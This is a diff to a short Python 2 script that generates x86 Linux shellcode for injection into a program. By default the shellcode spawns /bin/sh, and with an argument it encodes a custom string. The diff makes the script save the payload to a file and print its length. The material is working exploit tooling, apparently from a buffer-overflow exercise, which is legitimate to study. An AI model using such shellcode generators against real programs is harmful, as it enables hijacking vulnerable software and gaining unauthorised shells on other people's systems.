@@ -2,7 +2,6 @@
 
 import os
 import sys
-import re
 
 # take a string and convert it to hex similar to how
 # shellcode is injected into a program. Returns the
@@ -29,6 +28,7 @@ def asciiToHex(str):
     return returnStr
 
 # if no arguments are provided, the default is bin/sh
+# Otherwise, make shellcode out of a custom string
 if(len(sys.argv) == 1):
     shellcode = "\\x31\\xc0\\x50" + \
                 asciiToHex('bin/sh') + \
@@ -48,4 +48,8 @@ else:
                 "\\x31\\xdb\\xcd\\x80" + \
                 "\\x66\\x90\\x90"
 
-print shellcode
+target = open('shellcode', 'w')
+target.truncate()
+target.write(shellcode)
+
+print "Here is the shellcode to inject: " + shellcode + "\nand it is ", len(shellcode), " characters long and ", len(shellcode) / 4, " bytes long"
